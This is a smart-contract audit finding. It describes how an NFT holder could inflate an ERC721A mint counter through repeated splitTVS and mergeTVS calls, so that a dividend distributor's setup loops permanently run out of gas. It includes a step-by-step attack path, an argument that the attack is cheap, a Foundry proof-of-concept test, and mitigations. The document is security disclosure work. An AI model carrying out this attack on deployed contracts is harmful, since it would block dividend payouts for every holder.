# [000194] NFTholder will DoS dividend configuration for all TVS holders
  
  ### Summary

 ERC721A’s monotonically increasing `_totalMinted()` counter will cause a protocol-wide dividend configuration DoS for every TVS holder as an NFT holder repeatedly calls `splitTVS` to inflate historical mints and then merges the shards to keep supply small while `A26ZDividendDistributor._setAmounts/_setDividends` iterate `nft.getTotalMinted()` (`protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol:126-223`).

### Root Cause

 In `protocol/src/contracts/A26ZDividendDistributor/A26ZDividendDistributor.sol:126-223` the dividend loops rely on `nft.getTotalMinted()`—ERC721A’s historical counter—which never shrinks when `splitTVS` (`protocol/src/contracts/vesting/AlignerzVesting.sol:1050-1105`) mints helper NFTs and later burns them, so loop costs scale with history instead of live supply.

### Internal Pre-conditions

 1. NFT holder needs to call `splitTVS()` repeatedly with long `percentages` arrays to set `_totalMinted` to be at least tens of thousands while keeping only one live NFT (via `mergeTVS`).
2. Dividend owner needs to call `setUpTheDividends()`/`setAmounts()`/`setDividends()` after `_totalMinted` has been bloated.

### External Pre-conditions

 None.

### Attack Path

1. NFT holder calls `splitTVS(projectId, percentages, nftId)` with thousands of near-zero percentages, minting thousands of fresh NFTs while the sum still equals `BASIS_POINT`.
2. NFT holder calls `mergeTVS` to merge/burn the temporary NFTs, restoring a single live NFT but leaving `_totalMinted` high.
3. Steps 1–2 are repeated until `_totalMinted` reaches hundreds of thousands.
4. Admin later calls `setUpTheDividends` (or `setAmounts/setDividends`), which loops over the entire `nft.getTotalMinted()` history and now runs out of gas, reverting forever.

### Impact

 The protocol cannot configure dividends; no TVS holder can ever receive the stablecoin reserve until the contracts are redeployed, effectively bricking dividend payouts.

Side Note: 
The attacker needs to own only one TVS NFT and pay for the gas of repeated splitTVS + mergeTVS calls. Each split runs a loop that mints thousands of temporary NFTs (one per extra percentage entry) and then pays the splitFeeRate. Merging burns them and charges mergeFeeRate. So yes, the attacker spends gas—and the more they inflate _totalMinted, the higher their cumulative gas bill.

However:

Fees are proportional to the allocation amounts, not to the size of percentages, so a malicious holder can split with mostly zero percentages and incur only the base gas cost of minting/burning, not a proportional fee.
Even if the attack costs a few hundred dollars in gas, the payoff is protocol-wide: once _totalMinted is large enough, setUpTheDividends reverts forever. Blocking all future dividend rounds is a much larger impact than the attacker’s sunk gas.
So the attack is still economically viable: the cost is bounded, while the upside (disabling every future dividend payout) is huge.

### PoC

```solidity

contract A26ZDividendDistributorPoCTest is Test {
    A26ZDividendDistributor internal distributor;
    VestingStub internal vesting;
    NFTStub internal nft;
    MockUSD internal stablecoin;
    Aligners26 internal tvsToken;
    MockUSD internal secondaryToken;
    address internal constant nftHolder = address(0xBEEF);
    function setUp() public {
        stablecoin = new MockUSD();
        tvsToken = new Aligners26("Aligners26", "A26Z");
        secondaryToken = new MockUSD();
        vesting = new VestingStub();
        nft = new NFTStub();

        distributor = new A26ZDividendDistributor(
            address(vesting),
            address(nft),
            address(stablecoin),
            block.timestamp,
            30 days,
            address(tvsToken)
        );

        // Seed dividend state so _setAmounts() performs work.
        stablecoin.transfer(address(distributor), 1_000_000);
        nft.setOwner(0, nftHolder);
    }

function test_PoC_inflatedTotalMintedBricksSetUpTheDividends() public {
        _primeAllocation(0, 500 ether);

        bytes memory payload = abi.encodeCall(A26ZDividendDistributor.setUpTheDividends, ());
        uint256 gasBudget = 2_500_000;
        (bool successBefore,) = address(distributor).call{gas: gasBudget}(payload);
        assertTrue(successBefore, "Fresh state should fit comfortably within the gas stipend");

        _inflateHistoricalMints(60_000);

        (bool successAfter,) = address(distributor).call{gas: gasBudget}(payload);
        assertFalse(successAfter, "Historical splits inflate _totalMinted and consume the same gas budget");

    }

function _primeAllocation(uint256 nftId, uint256 amount) internal {
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = amount;
        uint256[] memory claimedSeconds = new uint256[](1);
        claimedSeconds[0] = 1;
        uint256[] memory vestingPeriods = new uint256[](1);
        vestingPeriods[0] = 30 days;
        bool[] memory claimedFlows = new bool[](1);
        claimedFlows[0] = false;

        vesting.primeAllocation(
            nftId,
            IERC20(address(secondaryToken)),
            amounts,
            claimedSeconds,
            vestingPeriods,
            claimedFlows
        );
    }

    function _inflateHistoricalMints(uint256 ghostId) internal {
        nft.setOwner(ghostId, nftHolder);
        nft.burn(ghostId);
        assertEq(
            nft.getTotalMinted(),
            ghostId + 1,
            "ERC721A counter now reflects the inflated historical mint count"
        );
    }
}


```

### Mitigation

 Track and iterate only live NFT IDs (e.g., maintain an enumerable set or depend on `totalSupply`) so dividend loops scale with actual supply instead of `_totalMinted` history.
- Bound `splitTVS` by rejecting zero percentages, enforcing a hard limit on `percentages.length`, or charging per-shard fees so attackers cannot cheaply inflate `_totalMinted`.
  